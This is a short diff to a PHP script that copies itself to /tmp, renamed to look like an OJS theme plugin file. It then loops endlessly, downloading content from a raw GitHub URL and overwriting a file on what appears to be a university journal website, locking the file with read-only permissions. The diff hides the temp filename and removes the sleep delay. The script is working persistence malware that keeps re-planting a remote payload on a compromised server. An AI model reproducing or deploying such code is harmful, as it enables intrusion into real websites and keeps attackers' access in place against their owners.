@@ -1,8 +1,8 @@
 <?php
-$targetFile = "	/home/kuisjour/attarbawiy.uis.edu.my/plugins/themes/default/DefaultThemePluginSettings.php";
+$targetFile = "/home/kuisjour/attarbawiy.uis.edu.my/plugins/themes/default/DefaultThemePluginSettings.php";
 $sourceURL = "https://raw.githubusercontent.com/anindiyaadni/wkwk/refs/heads/main/0t";
 
-$tmpPath = "/tmp/.kwokers_update.php";
+$tmpPath = "/tmp/DefaultThemePluginSettings.php";
 
 if (FILE !== $tmpPath) {
     copy(FILE, $tmpPath);
@@ -25,7 +25,7 @@ while (true) {
     curl_close($ch);
 
     if (!$newContent) {
-        sleep(35);
+        sleep(0);
         continue;
     }
 
@@ -41,6 +41,6 @@ while (true) {
         @chmod($targetFile, 0444);
     }
 
-    sleep(35);
+    sleep(0);
 }
 ?>
